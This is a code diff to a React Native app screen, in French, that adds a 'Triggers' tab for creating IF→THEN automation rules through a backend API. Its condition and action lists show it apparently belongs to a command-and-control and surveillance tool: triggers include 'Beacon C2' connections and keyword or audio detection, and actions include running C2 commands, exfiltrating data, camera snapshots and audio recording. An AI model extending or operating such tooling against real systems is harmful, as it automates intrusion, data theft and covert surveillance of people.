@@ -30,6 +30,7 @@ export default function AutonomyScreen() {
           { id: 'tasks',    label: '⏰ Tâches' },
           { id: 'alerts',   label: `🔔 Alertes${unread > 0 ? ` (${unread})` : ''}` },
           { id: 'monitors', label: '🖥️ Moniteurs' },
+          { id: 'triggers', label: '⚡ Triggers' },
         ].map(t => (
           <TouchableOpacity key={t.id} style={[s.tab, tab === t.id && s.tabActive]} onPress={() => setTab(t.id)}>
             <Text style={[s.tabText, tab === t.id && s.tabTextActive]}>{t.label}</Text>
@@ -40,6 +41,7 @@ export default function AutonomyScreen() {
       {tab === 'tasks'    && <TasksTab />}
       {tab === 'alerts'   && <AlertsTab onRead={() => setUnread(0)} />}
       {tab === 'monitors' && <MonitorsTab />}
+      {tab === 'triggers' && <TriggersTab />}
     </View>
   );
 }
@@ -358,6 +360,271 @@ function MonitorsTab() {
     </ScrollView>
   );
 }
+
+// ── Triggers Tab ──────────────────────────────────────────────────────────────
+
+const CONDITION_TYPES = [
+  { id: 'audio_level',    label: '🎤 Niveau audio',    desc: 'Niveau micro > seuil' },
+  { id: 'motion_detection', label: '📷 Mouvement',     desc: 'Caméra détecte mouvement' },
+  { id: 'network_device', label: '📡 Nouv. appareil',  desc: 'Appareil réseau détecté' },
+  { id: 'keyword_detected', label: '🔤 Mot-clé',       desc: 'Mot-clé dans audio/texte' },
+  { id: 'scheduled_time', label: '⏰ Planifié',        desc: 'Expression cron' },
+  { id: 'file_changed',   label: '📁 Fichier modifié', desc: 'Modification de fichier' },
+  { id: 'alert_created',  label: '🚨 Alerte SOC',      desc: 'Nouvelle alerte créée' },
+  { id: 'beacon_connected', label: '🧠 Beacon C2',     desc: 'Nouveau beacon connecté' },
+];
+
+const ACTION_TYPES = [
+  { id: 'take_snapshot',    label: '📸 Snapshot',       desc: 'Photo caméra' },
+  { id: 'start_recording',  label: '🎤 Enregistrer',    desc: 'Démarrer audio' },
+  { id: 'send_alert',       label: '🔔 Alerte SOC',     desc: 'Créer alerte' },
+  { id: 'execute_c2_command', label: '💻 Cmd C2',       desc: 'Exécuter commande' },
+  { id: 'start_scan',       label: '🔍 Scanner',        desc: 'Lancer scan réseau' },
+  { id: 'exfiltrate_data',  label: '📤 Exfiltrer',      desc: 'Déclencher exfil' },
+  { id: 'send_notification', label: '📲 Notif',         desc: 'Push notification' },
+  { id: 'run_script',       label: '⚙️ Script',         desc: 'Exécuter script' },
+];
+
+function TriggersTab() {
+  const [triggers,  setTriggers]  = useState([]);
+  const [logs,      setLogs]      = useState([]);
+  const [showForm,  setShowForm]  = useState(false);
+  const [loading,   setLoading]   = useState(true);
+  const [logsFor,   setLogsFor]   = useState(null);
+  const [testing,   setTesting]   = useState(null);
+
+  const load = useCallback(async (silent = false) => {
+    if (!silent) setLoading(true);
+    try {
+      const d = await apiJSON('/api/triggers/');
+      setTriggers(d.triggers || d || []);
+    } catch (_) {}
+    finally { setLoading(false); }
+  }, []);
+
+  useEffect(() => { load(); }, [load]);
+
+  const toggle = async (id) => {
+    try { await apiFetch(`/api/triggers/${id}/toggle`, { method: 'POST' }); load(true); }
+    catch (e) { Alert.alert('Erreur', e.message); }
+  };
+
+  const del = async (id) => {
+    Alert.alert('Supprimer', 'Supprimer ce trigger ?', [
+      { text: 'Annuler', style: 'cancel' },
+      { text: 'Supprimer', style: 'destructive', onPress: async () => {
+        try { await apiFetch(`/api/triggers/${id}`, { method: 'DELETE' }); load(true); }
+        catch (e) { Alert.alert('Erreur', e.message); }
+      }},
+    ]);
+  };
+
+  const test = async (id) => {
+    setTesting(id);
+    try {
+      const d = await apiJSON(`/api/triggers/${id}/test`, { method: 'POST' });
+      Alert.alert('Test résultat', JSON.stringify(d, null, 2).slice(0, 300));
+    } catch (e) { Alert.alert('Erreur', e.message); }
+    finally { setTesting(null); }
+  };
+
+  const loadLogs = async (id) => {
+    setLogsFor(id);
+    try {
+      const d = await apiJSON(`/api/triggers/${id}/logs`);
+      setLogs(d.logs || d || []);
+    } catch (_) { setLogs([]); }
+  };
+
+  return (
+    <View style={{ flex: 1 }}>
+      {/* Logs drawer */}
+      {logsFor && (
+        <View style={trig.logsDrawer}>
+          <View style={trig.logsHeader}>
+            <Text style={trig.logsTitle}>⚡ Logs du trigger</Text>
+            <TouchableOpacity onPress={() => setLogsFor(null)}><Text style={trig.logsClose}>✕</Text></TouchableOpacity>
+          </View>
+          <ScrollView style={trig.logsList}>
+            {logs.length === 0
+              ? <Text style={s.empty}>Aucun log.</Text>
+              : logs.map((l, i) => (
+                <View key={i} style={trig.logRow}>
+                  <Text style={[trig.logDot, { color: l.success ? colors.green : colors.red }]}>●</Text>
+                  <View style={{ flex: 1 }}>
+                    <Text style={trig.logTs}>{new Date(l.triggered_at || l.ts).toLocaleString('fr-FR')}</Text>
+                    {l.action_result && <Text style={trig.logResult} numberOfLines={2}>{JSON.stringify(l.action_result)}</Text>}
+                  </View>
+                </View>
+              ))
+            }
+          </ScrollView>
+        </View>
+      )}
+
+      <ScrollView contentContainerStyle={s.list}>
+        <TouchableOpacity style={s.addBtn} onPress={() => setShowForm(v => !v)}>
+          <Text style={s.addBtnText}>{showForm ? '✕ Annuler' : '+ Nouveau trigger IF→THEN'}</Text>
+        </TouchableOpacity>
+
+        {showForm && <TriggerForm onSaved={() => { setShowForm(false); load(); }} />}
+
+        {loading
+          ? <ActivityIndicator size="large" color={colors.accent} style={{ marginTop: 20 }} />
+          : triggers.length === 0
+            ? <View style={s.emptyWrap}><Text style={s.emptyIcon}>⚡</Text><Text style={s.empty}>Aucun trigger.</Text></View>
+            : triggers.map(t => {
+                const cond = CONDITION_TYPES.find(c => c.id === t.condition_type);
+                const act  = ACTION_TYPES.find(a => a.id === t.action_type);
+                return (
+                  <View key={t.trigger_id || t.id} style={[trig.card, t.enabled && { borderColor: colors.accent + '50' }]}>
+                    <View style={trig.cardHeader}>
+                      <Text style={trig.cardName} numberOfLines={1}>{t.name}</Text>
+                      {t.trigger_count > 0 && (
+                        <Text style={trig.countBadge}>{t.trigger_count}x</Text>
+                      )}
+                    </View>
+
+                    {/* IF → THEN visual */}
+                    <View style={trig.ifThen}>
+                      <View style={[trig.condBox, { borderColor: '#60a5fa50', backgroundColor: '#60a5fa10' }]}>
+                        <Text style={trig.boxLabel}>SI</Text>
+                        <Text style={trig.boxValue}>{cond?.label || t.condition_type}</Text>
+                      </View>
+                      <Text style={trig.arrow}>→</Text>
+                      <View style={[trig.condBox, { borderColor: '#34d39950', backgroundColor: '#34d39910' }]}>
+                        <Text style={trig.boxLabel}>ALORS</Text>
+                        <Text style={trig.boxValue}>{act?.label || t.action_type}</Text>
+                      </View>
+                    </View>
+
+                    {t.last_triggered && (
+                      <Text style={trig.lastTs}>
+                        Dernier déclenchement : {new Date(t.last_triggered).toLocaleString('fr-FR')}
+                      </Text>
+                    )}
+
+                    <View style={trig.actions}>
+                      <TouchableOpacity style={[trig.btn, t.enabled ? trig.btnOff : trig.btnOn]} onPress={() => toggle(t.trigger_id || t.id)}>
+                        <Text style={trig.btnText}>{t.enabled ? '⏸ On' : '▶ Off'}</Text>
+                      </TouchableOpacity>
+                      <TouchableOpacity style={trig.btn} onPress={() => test(t.trigger_id || t.id)} disabled={testing === (t.trigger_id || t.id)}>
+                        <Text style={trig.btnText}>{testing === (t.trigger_id || t.id) ? '…' : '▶ Test'}</Text>
+                      </TouchableOpacity>
+                      <TouchableOpacity style={trig.btn} onPress={() => loadLogs(t.trigger_id || t.id)}>
+                        <Text style={trig.btnText}>📋 Logs</Text>
+                      </TouchableOpacity>
+                      <TouchableOpacity style={[trig.btn, { borderColor: colors.red }]} onPress={() => del(t.trigger_id || t.id)}>
+                        <Text style={[trig.btnText, { color: colors.red }]}>✕</Text>
+                      </TouchableOpacity>
+                    </View>
+                  </View>
+                );
+              })
+        }
+      </ScrollView>
+    </View>
+  );
+}
+
+function TriggerForm({ onSaved }) {
+  const [name,          setName]          = useState('');
+  const [condType,      setCondType]      = useState('beacon_connected');
+  const [condThreshold, setCondThreshold] = useState('');
+  const [condKeyword,   setCondKeyword]   = useState('');
+  const [condCron,      setCondCron]      = useState('0 * * * *');
+  const [actionType,    setActionType]    = useState('send_alert');
+  const [actionMsg,     setActionMsg]     = useState('');
+  const [severity,      setSeverity]      = useState('HIGH');
+  const [loading,       setLoading]       = useState(false);
+
+  const save = async () => {
+    if (!name.trim()) return;
+    setLoading(true);
+    const condition = {};
+    if (condType === 'audio_level')     condition.threshold = Number(condThreshold) || 50;
+    if (condType === 'keyword_detected') condition.keyword  = condKeyword;
+    if (condType === 'scheduled_time')  condition.cron     = condCron;
+    const action = { message: actionMsg || name, severity };
+    try {
+      await apiFetch('/api/triggers/', {
+        method: 'POST',
+        body: JSON.stringify({ name, condition_type: condType, condition, action_type: actionType, action, enabled: true }),
+      });
+      onSaved();
+    } catch (e) { Alert.alert('Erreur', e.message); }
+    finally { setLoading(false); }
+  };
+
+  return (
+    <View style={s.form}>
+      <TextInput style={s.input} value={name} onChangeText={setName} placeholder="Nom du trigger *" placeholderTextColor={colors.textDim} />
+
+      <Text style={s.label}>Condition (SI)</Text>
+      <ScrollView horizontal showsHorizontalScrollIndicator={false} contentContainerStyle={{ flexDirection: 'row', gap: 6, paddingBottom: 4 }}>
+        {CONDITION_TYPES.map(c => (
+          <TouchableOpacity key={c.id} style={[s.seg, { minWidth: 90 }, condType === c.id && s.segActive]} onPress={() => setCondType(c.id)}>
+            <Text style={[s.segText, condType === c.id && s.segTextActive]}>{c.label}</Text>
+          </TouchableOpacity>
+        ))}
+      </ScrollView>
+      {condType === 'audio_level'     && <TextInput style={s.input} value={condThreshold} onChangeText={setCondThreshold} placeholder="Seuil dB (ex: 70)" placeholderTextColor={colors.textDim} keyboardType="numeric" />}
+      {condType === 'keyword_detected' && <TextInput style={s.input} value={condKeyword}  onChangeText={setCondKeyword}  placeholder="Mot-clé déclencheur" placeholderTextColor={colors.textDim} />}
+      {condType === 'scheduled_time'  && <TextInput style={s.input} value={condCron}      onChangeText={setCondCron}    placeholder="Cron: 0 * * * *" placeholderTextColor={colors.textDim} />}
+
+      <Text style={s.label}>Action (ALORS)</Text>
+      <ScrollView horizontal showsHorizontalScrollIndicator={false} contentContainerStyle={{ flexDirection: 'row', gap: 6, paddingBottom: 4 }}>
+        {ACTION_TYPES.map(a => (
+          <TouchableOpacity key={a.id} style={[s.seg, { minWidth: 90 }, actionType === a.id && s.segActive]} onPress={() => setActionType(a.id)}>
+            <Text style={[s.segText, actionType === a.id && s.segTextActive]}>{a.label}</Text>
+          </TouchableOpacity>
+        ))}
+      </ScrollView>
+      <TextInput style={s.input} value={actionMsg} onChangeText={setActionMsg} placeholder="Message / commande" placeholderTextColor={colors.textDim} />
+
+      {actionType === 'send_alert' && (
+        <View style={s.segRow}>
+          {['LOW', 'MEDIUM', 'HIGH', 'CRITICAL'].map(sv => (
+            <TouchableOpacity key={sv} style={[s.seg, severity === sv && s.segActive]} onPress={() => setSeverity(sv)}>
+              <Text style={[s.segText, severity === sv && s.segTextActive]}>{sv}</Text>
+            </TouchableOpacity>
+          ))}
+        </View>
+      )}
+
+      <TouchableOpacity style={[s.saveBtn, !name.trim() && s.saveBtnOff]} onPress={save} disabled={loading || !name.trim()}>
+        <Text style={s.saveBtnText}>{loading ? '…' : 'Créer le trigger'}</Text>
+      </TouchableOpacity>
+    </View>
+  );
+}
+
+const trig = StyleSheet.create({
+  card: { backgroundColor: colors.bgCard, borderRadius: 12, padding: 14, borderWidth: 1, borderColor: colors.border, gap: 8 },
+  cardHeader: { flexDirection: 'row', alignItems: 'center', gap: 8 },
+  cardName: { flex: 1, color: colors.text, fontSize: 14, fontWeight: '700' },
+  countBadge: { fontSize: 11, color: colors.accent, backgroundColor: colors.accent + '15', paddingHorizontal: 8, paddingVertical: 2, borderRadius: 10 },
+  ifThen: { flexDirection: 'row', alignItems: 'center', gap: 8 },
+  condBox: { flex: 1, borderRadius: 8, borderWidth: 1, padding: 8, gap: 2 },
+  boxLabel: { color: colors.textDim, fontSize: 9, letterSpacing: 1, fontWeight: '700' },
+  boxValue: { color: colors.text, fontSize: 11, fontWeight: '600' },
+  arrow: { color: colors.accent, fontSize: 18, fontWeight: '700' },
+  lastTs: { color: colors.textDim, fontSize: 10 },
+  actions: { flexDirection: 'row', gap: 6 },
+  btn: { paddingHorizontal: 10, paddingVertical: 6, borderRadius: 8, borderWidth: 1, borderColor: colors.border },
+  btnOn: { borderColor: colors.green, backgroundColor: colors.green + '15' },
+  btnOff: { borderColor: colors.textDim, backgroundColor: 'transparent' },
+  btnText: { color: colors.text, fontSize: 11, fontWeight: '600' },
+  logsDrawer: { backgroundColor: colors.bgCard, borderBottomWidth: 1, borderBottomColor: colors.border, maxHeight: 200 },
+  logsHeader: { flexDirection: 'row', alignItems: 'center', justifyContent: 'space-between', padding: 12, borderBottomWidth: 1, borderBottomColor: colors.border },
+  logsTitle: { color: colors.accent, fontSize: 13, fontWeight: '700' },
+  logsClose: { color: colors.red, fontSize: 16, fontWeight: '700', padding: 4 },
+  logsList: { padding: 8 },
+  logRow: { flexDirection: 'row', gap: 8, paddingVertical: 4, borderBottomWidth: 1, borderBottomColor: colors.border + '30' },
+  logDot: { fontSize: 12, paddingTop: 2 },
+  logTs: { color: colors.textDim, fontSize: 11 },
+  logResult: { color: colors.textMuted, fontSize: 11, fontFamily: 'monospace' },
+});
 
 const s = StyleSheet.create({
   container: { flex: 1, backgroundColor: colors.bg },
